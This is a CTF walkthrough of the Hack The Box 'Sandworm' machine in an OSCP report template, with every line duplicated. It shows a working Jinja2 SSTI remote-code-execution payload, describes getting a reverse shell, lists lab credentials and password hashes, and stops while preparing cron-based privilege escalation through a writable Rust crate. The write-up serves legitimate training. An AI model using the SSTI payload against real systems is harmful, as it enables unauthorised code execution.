---
---
title: "Offensive Security Certified Professional Exam Report"
title: "Offensive Security Certified Professional Exam Report"
author: ["student@youremailaddress.com", "OSID: XXXX"]
author: ["student@youremailaddress.com", "OSID: XXXX"]
date: "2020-07-25"
date: "2020-07-25"
subject: "Markdown"
subject: "Markdown"
keywords: [Markdown, Example]
keywords: [Markdown, Example]
subtitle: "OSCP Exam Report"
subtitle: "OSCP Exam Report"
lang: "en"
lang: "en"
titlepage: true
titlepage: true
titlepage-color: "1E90FF"
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
titlepage-rule-height: 2
book: true
book: true
book-class: false
book-class: false
classoption: oneside
classoption: oneside
code-block-font-size: \scriptsize
code-block-font-size: \scriptsize
---
---
Written by [0xe10c](https://app.hackthebox.com/profile/525177)
Written by [0xe10c](https://app.hackthebox.com/profile/525177)




# Enumeration
# Enumeration






## nmap scan
## nmap scan






![[Pasted image 20230702145550.png]]
![[Pasted image 20230702145550.png]]




Update `/etc/hosts`
Update `/etc/hosts`


```
```
10.10.11.218    ssa.htb
10.10.11.218    ssa.htb
```
```




## website - `https://ssa.htb`
## website - `https://ssa.htb`




### forced browsing - feroxbuster and gobuster
### forced browsing - feroxbuster and gobuster






#### feroxbuster - exposing admin panel
#### feroxbuster - exposing admin panel




FerOxBuster forced browsing reveals a few endpoints. 
FerOxBuster forced browsing reveals a few endpoints. 




![[Pasted image 20230703134056.png]]
![[Pasted image 20230703134056.png]]




There appears to be some sort of admin panel accessible by login.
There appears to be some sort of admin panel accessible by login.




![[Pasted image 20230703134156.png]]
![[Pasted image 20230703134156.png]]






#### gobuster vhost enumeration
#### gobuster vhost enumeration


There were no vhosts identified by `gobuster`
There were no vhosts identified by `gobuster`


### home page
### home page


Let's visit the website
Let's visit the website


![[Pasted image 20230702150303.png]]
![[Pasted image 20230702150303.png]]




![[Pasted image 20230702151031.png]]
![[Pasted image 20230702151031.png]]




After being redirected from `10.10.11.218`, we land on the HTTPS webpage `ssa.htb`, the home page of the National Security uh, Secret Spy Agency.
After being redirected from `10.10.11.218`, we land on the HTTPS webpage `ssa.htb`, the home page of the National Security uh, Secret Spy Agency.


At the bottom of the page we see that this is a Flask MCV website.  Validate by testing extensions `.(html|php)`. Since this is Flask, we suspect the potential for Server-Side Template Injection (SSTI) vulnerability.
At the bottom of the page we see that this is a Flask MCV website.  Validate by testing extensions `.(html|php)`. Since this is Flask, we suspect the potential for Server-Side Template Injection (SSTI) vulnerability.


Of the three links at the top of the page, only the "Contact" page seems to bear fruit.
Of the three links at the top of the page, only the "Contact" page seems to bear fruit.




### Contact page
### Contact page




![[Pasted image 20230702151508.png]]
![[Pasted image 20230702151508.png]]






### PGP encryption guide page
### PGP encryption guide page


This page is a demo for PGP encryption.  On this page you can 
This page is a demo for PGP encryption.  On this page you can 
- download the SSA PGP public key
- download the SSA PGP public key
- use SSA PGP public key to encrypt, decrypt, and verify messages
- use SSA PGP public key to encrypt, decrypt, and verify messages
- do all of that same functionality with a user-owned PGP keypair.
- do all of that same functionality with a user-owned PGP keypair.


There's not gonna be a super deep dive in this document, but I have prepared [[PGP and GnuPG|this document]] that goes through each of the steps with commands.
There's not gonna be a super deep dive in this document, but I have prepared [[PGP and GnuPG|this document]] that goes through each of the steps with commands.




![[Pasted image 20230702151729.png]]
![[Pasted image 20230702151729.png]]




#### SSA PGP public key
#### SSA PGP public key




![[Pasted image 20230702152245.png]]
![[Pasted image 20230702152245.png]]


```pgp
```pgp
-----BEGIN PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PUBLIC KEY BLOCK-----


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
=P8U3
=P8U3
-----END PGP PUBLIC KEY BLOCK-----
-----END PGP PUBLIC KEY BLOCK-----


```
```






### Testing Signature Verification functionality
### Testing Signature Verification functionality


On this part of the PGP Guide page, the user is able to enter their own PGP public key and a signed PGP message.
On this part of the PGP Guide page, the user is able to enter their own PGP public key and a signed PGP message.


![[Pasted image 20230703161442.png]]
![[Pasted image 20230703161442.png]]






![[PGP and GnuPG#^7f2227]]
![[PGP and GnuPG#^7f2227]]




![[PGP and GnuPG#^e01be7]]
![[PGP and GnuPG#^e01be7]]


![[PGP and GnuPG#^c7e592]]
![[PGP and GnuPG#^c7e592]]


![[PGP and GnuPG#^414003]]
![[PGP and GnuPG#^414003]]


### testing template injection with PGP keypair
### testing template injection with PGP keypair


To help test the template injection, we used [this tool](https://github.com/atriox2510/pgp-pysuite.git) to create keys on the fly.  
To help test the template injection, we used [this tool](https://github.com/atriox2510/pgp-pysuite.git) to create keys on the fly.  
After testing each of the available fields, we identified the "Verify Signature" part of the page to be vulnerable.  Since the back-end is advertised as Flask, a payload of the form `{{ payload }}` contained in the "name" field of the PGP keys will be parsed and executed by Jinja/Flask.
After testing each of the available fields, we identified the "Verify Signature" part of the page to be vulnerable.  Since the back-end is advertised as Flask, a payload of the form `{{ payload }}` contained in the "name" field of the PGP keys will be parsed and executed by Jinja/Flask.


To validate:
To validate:
1. generate new PGP keypair with some raw Python payload in the name field, e.g. `{{ 'A' * 16 }}` or `{{ 17 * 4 }}`
1. generate new PGP keypair with some raw Python payload in the name field, e.g. `{{ 'A' * 16 }}` or `{{ 17 * 4 }}`
2. generate a *PGP signed message* with the malicious keypair
2. generate a *PGP signed message* with the malicious keypair
3. use website to verify malicious public key and signed message
3. use website to verify malicious public key and signed message
4. examine results to validate SSTI
4. examine results to validate SSTI




#### validating template injection - arithmetic
#### validating template injection - arithmetic




![[Pasted image 20230702155105.png]]
![[Pasted image 20230702155105.png]]






![[Pasted image 20230702155231.png]]
![[Pasted image 20230702155231.png]]




Since the name associated with the PGP keypair is controlled by the user, we believe this can be exploited with Flask/Jinja template injection to gain a reverse shell on the target.
Since the name associated with the PGP keypair is controlled by the user, we believe this can be exploited with Flask/Jinja template injection to gain a reverse shell on the target.




#### validating template injection - Flask enumeration
#### validating template injection - Flask enumeration




![[Pasted image 20230702155735.png]]
![[Pasted image 20230702155735.png]]




![[Pasted image 20230702160017.png]]
![[Pasted image 20230702160017.png]]






### validating template injection - RCE on server
### validating template injection - RCE on server


We tested a few payloads before we found one that works:
We tested a few payloads before we found one that works:


```
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
```


[Source](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
[Source](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)




![[Pasted image 20230702160824.png]]
![[Pasted image 20230702160824.png]]






##  What we have so far
##  What we have so far




- Users: `atlas`
- Users: `atlas`
- RCE through Flask/Jinja SSTI
- RCE through Flask/Jinja SSTI
- Some Flask/Jinja environment variables leaked through SSTI (next subsection)
- Some Flask/Jinja environment variables leaked through SSTI (next subsection)




### Enumeration of Flask/Jinja app environment
### Enumeration of Flask/Jinja app environment




![[Pasted image 20230702161755.png]]
![[Pasted image 20230702161755.png]]






#### Potential MySQL DB credentials 
#### Potential MySQL DB credentials 




```
```
atlas:GarlicAndOnionZ42
atlas:GarlicAndOnionZ42
```
```




#### Flask SECRET_KEY
#### Flask SECRET_KEY


```
```
SECRET_KEY:91668c1bc67132e3dcfb5b1a3e0c5c21
SECRET_KEY:91668c1bc67132e3dcfb5b1a3e0c5c21
```
```


![[Pasted image 20230702162518.png]]
![[Pasted image 20230702162518.png]]


[Source](https://flask.palletsprojects.com/en/2.3.x/config/#SECRET_KEY)
[Source](https://flask.palletsprojects.com/en/2.3.x/config/#SECRET_KEY)


>[!note]
>[!note]
`sandworm.sh` is a script written by the author to aid in the SSTI exploitation.  It is available at the end of the document.
`sandworm.sh` is a script written by the author to aid in the SSTI exploitation.  It is available at the end of the document.




# Foothold - limited reverse shell as `atlas`
# Foothold - limited reverse shell as `atlas`


Using the SSTI RCE, we were able to obtain a reverse shell as the `atlas` user.
Using the SSTI RCE, we were able to obtain a reverse shell as the `atlas` user.




![[Pasted image 20230702163422.png]]
![[Pasted image 20230702163422.png]]




After upgrading, we attempted some light manual enumeration, searching for more listening ports, files, etc.
After upgrading, we attempted some light manual enumeration, searching for more listening ports, files, etc.




![[Pasted image 20230702163916.png]]
![[Pasted image 20230702163916.png]]




This box seems to have nothing going for it.  No `curl`, no `wget`, no `nc`, no `find`?  That can't be.
This box seems to have nothing going for it.  No `curl`, no `wget`, no `nc`, no `find`?  That can't be.




![[Pasted image 20230702164058.png]]
![[Pasted image 20230702164058.png]]


I'll be damned.
I'll be damned.




![[Pasted image 20230702164242.png]]
![[Pasted image 20230702164242.png]]




## Other users
## Other users


There are only three users on the box with shell access
There are only three users on the box with shell access
- `root`
- `root`
- `silentobserver`
- `silentobserver`
- `atlas`
- `atlas`




![[Pasted image 20230702164431.png]]
![[Pasted image 20230702164431.png]]






## Further enumeration
## Further enumeration




Further enumeration with automated tools is difficult.  The home directory of `atlas` is read-only
Further enumeration with automated tools is difficult.  The home directory of `atlas` is read-only




![[Pasted image 20230702164908.png]]
![[Pasted image 20230702164908.png]]




`/tmp` is writable, but we don't gain much - with such a limited set of tools, `linpeas.sh` is effectively useless.
`/tmp` is writable, but we don't gain much - with such a limited set of tools, `linpeas.sh` is effectively useless.




![[Pasted image 20230702165413.png]]
![[Pasted image 20230702165413.png]]






![[Pasted image 20230702165446.png]]
![[Pasted image 20230702165446.png]]






![[Pasted image 20230702165742.png]]
![[Pasted image 20230702165742.png]]


`silentobserver` is also apparently `nobody`
`silentobserver` is also apparently `nobody`


![[Pasted image 20230702165858.png]]
![[Pasted image 20230702165858.png]]




![[Pasted image 20230702170114.png]]
![[Pasted image 20230702170114.png]]


[Source](https://wiki.ubuntu.com/nobody)
[Source](https://wiki.ubuntu.com/nobody)




# Pivot to user `silentobserver`
# Pivot to user `silentobserver`






![[Pasted image 20230702171019.png]]
![[Pasted image 20230702171019.png]]




Poking around `atlas`'s home directory, we find a file named `/home/atlas/.config/httpie/sessions/localhost_5000/admin.json`, which appears to contain credentials for the `silentobserver` user.
Poking around `atlas`'s home directory, we find a file named `/home/atlas/.config/httpie/sessions/localhost_5000/admin.json`, which appears to contain credentials for the `silentobserver` user.


## creds for `silentobserver`
## creds for `silentobserver`


```
```
silentobserver:quietLiketheWind22
silentobserver:quietLiketheWind22
```
```




### user flag
### user flag




![[Pasted image 20230702171309.png]]
![[Pasted image 20230702171309.png]]






## `silentobserver` enumeration
## `silentobserver` enumeration






### listening ports
### listening ports




![[Pasted image 20230702183556.png]]
![[Pasted image 20230702183556.png]]






#### port 5000 - `https://ssa.htb` Flask/Jinja application
#### port 5000 - `https://ssa.htb` Flask/Jinja application


Using SSH port forwarding, we accessed the service listening on port 5000.  It is the SSA website from the initial Enumeration phase.  
Using SSH port forwarding, we accessed the service listening on port 5000.  It is the SSA website from the initial Enumeration phase.  


![[Pasted image 20230702184004.png]]
![[Pasted image 20230702184004.png]]






![[Pasted image 20230702184342.png]]
![[Pasted image 20230702184342.png]]








#### port 3306 - `mysql` service 
#### port 3306 - `mysql` service 




![[Pasted image 20230702173622.png]]
![[Pasted image 20230702173622.png]]




contents of `users` table
contents of `users` table
```
```
+----+----------------+--------------------------------------------------------------------------------------------------------+
+----+----------------+--------------------------------------------------------------------------------------------------------+
| id | username       | password                                                                                               |
| id | username       | password                                                                                               |
+----+----------------+--------------------------------------------------------------------------------------------------------+
+----+----------------+--------------------------------------------------------------------------------------------------------+
|  1 | Odin           | pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f |
|  1 | Odin           | pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f |
|  2 | silentobserver | pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d |
|  2 | silentobserver | pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d |
+----+----------------+--------------------------------------------------------------------------------------------------------+
+----+----------------+--------------------------------------------------------------------------------------------------------+
```
```


wasn't able to crack straight away - may return as last resort
wasn't able to crack straight away - may return as last resort






## TipNet - backend for SSA "Contact" reporting page
## TipNet - backend for SSA "Contact" reporting page




Recall the [[HTB - Sandworm (Seasonal Week 1) - Walkthrough#Contact page|contact page]] found earlier, which accepts messages signed with the SSA PGP public key.
Recall the [[HTB - Sandworm (Seasonal Week 1) - Walkthrough#Contact page|contact page]] found earlier, which accepts messages signed with the SSA PGP public key.




![[Pasted image 20230702151508.png]]
![[Pasted image 20230702151508.png]]




Recall also the [[HTB - Sandworm (Seasonal Week 1) - Walkthrough#feroxbuster - exposing admin panel|exposed admin panel]] from the forced browsing scan.
Recall also the [[HTB - Sandworm (Seasonal Week 1) - Walkthrough#feroxbuster - exposing admin panel|exposed admin panel]] from the forced browsing scan.




![[Pasted image 20230703134156.png]]
![[Pasted image 20230703134156.png]]


Using `silentobserver`'s credentials, we are able to access the admin panel.
Using `silentobserver`'s credentials, we are able to access the admin panel.


![[Pasted image 20230703133433.png]]
![[Pasted image 20230703133433.png]]




Once authenticated, we can access the `/view` endpoint, which shows a list of "tips" submitted by the public through the "Contact" form.
Once authenticated, we can access the `/view` endpoint, which shows a list of "tips" submitted by the public through the "Contact" form.




### possible file inclusion, directory traversal
### possible file inclusion, directory traversal


Accessing one of the messages, we see in the URL that there is a parameter `fname` passed to the back end, referencing a filename of the form `<hash>.txt`. 
Accessing one of the messages, we see in the URL that there is a parameter `fname` passed to the back end, referencing a filename of the form `<hash>.txt`. 


![[Pasted image 20230703134826.png]]
![[Pasted image 20230703134826.png]]




Testing for file inclusion and directory traversal led nowhere.
Testing for file inclusion and directory traversal led nowhere.


![[Pasted image 20230703135050.png]]
![[Pasted image 20230703135050.png]]






## running process enumeration with `pspy` leads to discovery of TipNet service source code, backend `Upstream` MySQL database
## running process enumeration with `pspy` leads to discovery of TipNet service source code, backend `Upstream` MySQL database




![[Pasted image 20230703140147.png]]
![[Pasted image 20230703140147.png]]






### `/opt/tipnet`
### `/opt/tipnet`




![[Pasted image 20230703140614.png]]
![[Pasted image 20230703140614.png]]




![[Pasted image 20230703140700.png]]
![[Pasted image 20230703140700.png]]






![[Pasted image 20230703140801.png]]
![[Pasted image 20230703140801.png]]






![[Pasted image 20230703141023.png]]
![[Pasted image 20230703141023.png]]




![[Pasted image 20230703141125.png]]
![[Pasted image 20230703141125.png]]




### MySQL `Upstream` database
### MySQL `Upstream` database


The TipNet source code leaks credentials for the `tipnet` user to use the local MySQL database called `Upstream`.
The TipNet source code leaks credentials for the `tipnet` user to use the local MySQL database called `Upstream`.


```
```


# MySQL creds for tipnet user
# MySQL creds for tipnet user


tipnet:4The_Greater_GoodJ4A
tipnet:4The_Greater_GoodJ4A
```
```




![[Pasted image 20230703141617.png]]
![[Pasted image 20230703141617.png]]


There are two tables
There are two tables
* SIGINT
* SIGINT
* tip_submissions
* tip_submissions




#### SIGINT table
#### SIGINT table




![[Pasted image 20230703142132.png]]
![[Pasted image 20230703142132.png]]


Nothing of value (to us, at least).
Nothing of value (to us, at least).




#### tip_submissions table
#### tip_submissions table




![[Pasted image 20230703141739.png]]
![[Pasted image 20230703141739.png]]


These credentials are not valid for `root` login with `su` or `ssh`
These credentials are not valid for `root` login with `su` or `ssh`


We have validated that the service running on port 5000 is the TipNet service, which we've established is totally not spying on anyone at all.
We have validated that the service running on port 5000 is the TipNet service, which we've established is totally not spying on anyone at all.




### `/opt/crates/logger`
### `/opt/crates/logger`






![[Pasted image 20230703142612.png]]
![[Pasted image 20230703142612.png]]




![[Pasted image 20230703144739.png]]
![[Pasted image 20230703144739.png]]




## Analysis and synthesis of information
## Analysis and synthesis of information




TipNet is an application written in Rust.  Periodically a `root`-level cron job runs which wipes and rebuilds this project as the `atlas` user.  The command of interest from the cronjob is `/usr/bin/cargo run...`
TipNet is an application written in Rust.  Periodically a `root`-level cron job runs which wipes and rebuilds this project as the `atlas` user.  The command of interest from the cronjob is `/usr/bin/cargo run...`


`cargo` is the Rust package manager - if you've ever built a Node.js app from a Dockerfile, this will be a familiar concept to you.
`cargo` is the Rust package manager - if you've ever built a Node.js app from a Dockerfile, this will be a familiar concept to you.


When invoked as `cargo run`, by default the `Cargo.toml` manifest file in the working directory is sourced for the build.  In turn, dependencies are (recursively) sourced and built as needed.
When invoked as `cargo run`, by default the `Cargo.toml` manifest file in the working directory is sourced for the build.  In turn, dependencies are (recursively) sourced and built as needed.


>[!info]
>[!info]
> More information is available in the [Rust documentation](https://doc.rust-lang.org/cargo/index.html).
> More information is available in the [Rust documentation](https://doc.rust-lang.org/cargo/index.html).


The TipNet `Cargo.toml` file specifies a dependency on a `logger` package located on the target machine at `/opt/crates/logger`.
The TipNet `Cargo.toml` file specifies a dependency on a `logger` package located on the target machine at `/opt/crates/logger`.


Contents of `/opt/tipnet/Cargo.toml` file:
Contents of `/opt/tipnet/Cargo.toml` file:
```
```
[package]
[package]
name = "tipnet"
name = "tipnet"
version = "0.1.0"
version = "0.1.0"
edition = "2021"
edition = "2021"




# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html




[dependencies]
[dependencies]
chrono = "0.4"
chrono = "0.4"
mysql = "23.0.1"
mysql = "23.0.1"
nix = "0.18.0"
nix = "0.18.0"
logger = {path = "../crates/logger"}
logger = {path = "../crates/logger"}
sha2 = "0.9.0"
sha2 = "0.9.0"
hex = "0.4.3"
hex = "0.4.3"
```
```


We have already seen that the file `/opt/crates/logger/src/lib.rs` is writable by the `silentobserver` user.  Let's test to see if we get command execution with this file.
